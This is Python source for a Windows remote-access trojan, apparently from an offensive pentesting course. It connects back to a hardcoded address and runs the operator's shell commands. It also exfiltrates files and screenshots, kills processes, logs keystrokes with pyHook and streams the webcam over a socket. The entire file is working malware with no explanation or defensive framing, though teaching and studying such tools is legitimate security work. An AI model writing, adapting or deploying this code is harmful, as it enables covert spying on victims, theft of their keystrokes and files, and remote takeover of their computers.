# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
from PIL import ImageGrab 
import socket, subprocess, os, tempfile 
import shutil, threading, win32api
import pythoncom, pyHook          
import numpy
import cv2

keyLog = tempfile.mkdtemp()
f_name = keyLog+"\log.txt"
ip_address = '192.168.69.12'

def recWebCam():
    try:
        cap = cv2.VideoCapture(1) #Capture from webcam       
        while True:
            ret, frame = cap.read() #get image from frame
            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
            data = numpy.array(imgencode) #create numpy array from image encoding
            stringData = data.tostring() #convert numpy array to string
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 9900))
            soc.sendall(stringData)
            soc.close()
    except:
        cap = cv2.VideoCapture(0) #Capture from webcam
        while True:
            ret, frame = cap.read() #get image from frame
            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
            data = numpy.array(imgencode) #create numpy array from image encoding
            stringData = data.tostring() #convert numpy array to string
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 9900))
            soc.sendall(stringData)
            soc.close()
        
def keypressed(event):
    global data
    if event.Ascii == 13:
            keys = '\n'
            fp = open(f_name,'a')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 8:
            keys = ' <BS> '
            fp = open(f_name,'a')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 9:
            keys = ' \t '
            fp = open(f_name,'a')
            data = keys
            fp.write(data)
            fp.close()
    elif event.Ascii == 27:
            keys = ' <ESC> '
            fp = open(f_name,'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
            pass
    else:
            keys = chr(event.Ascii)
            fp = open(f_name,'a')
            data = keys
            fp.write(data)
            fp.close()

def startLogger():
    global obj
    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()
    
def stopLogger():
        obj.UnhookKeyboard()
    
def transfer(s,path,command):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024*1024)#1MB
        while packet != '':
            s.send(packet) 
            packet = f.read(1024*1024)
        if 'grab' in command:
            s.send('DONE')
        elif 'screencap' in command:
            s.send('captured')
        elif 'getLogFile' in command:
            s.send('LogSent')
        f.close()
    else: # the file doesn't exist
        s.send('Unable to find out the file')

def getKeyLogFile(s, path):
    transfer(s,path)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8080))
 
    while True: 
        command =  s.recv(1024*1024)
        
        if 'kill' in command:
            command = command.split(' ')
            command = 'Taskkill /IM '+command[1]+' /F'
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        elif 'terminate' in command:
            s.close()
            break
        elif 'grab' in command:            
            grab,path = command.split(' ')
            try:
                transfer(s,path,command)
            except Exception,e:
                s.send ( str(e) )  
                pass
        elif 'screencap' in command:
            try:
                dirpath = tempfile.mkdtemp()
                ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
                transfer(s, dirpath+"\img.jpg", command)
                shutil.rmtree(dirpath)
            except Exception, e:
                s.send(str(e))
                pass
        elif 'startLogger' in command:
            logging = threading.Thread(target=startLogger)
            logging.start()
            s.send('[+] Keylogger started')
        elif 'activateWebcam' in command:
            webcam = threading.Thread(target=recWebCam)
            webcam.start()
        elif 'stopLogger' in command:
            stopLogger()
            s.send('[+] Keylogger stopped')
        elif 'getLogFile' in command:
            transfer(s, f_name, command)
            shutil.rmtree(keyLog)
        elif 'cd' in command:
            code,directory = command.split (' ')
            os.chdir(directory)
            s.send( "[+] CWD Is " + os.getcwd() )
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()











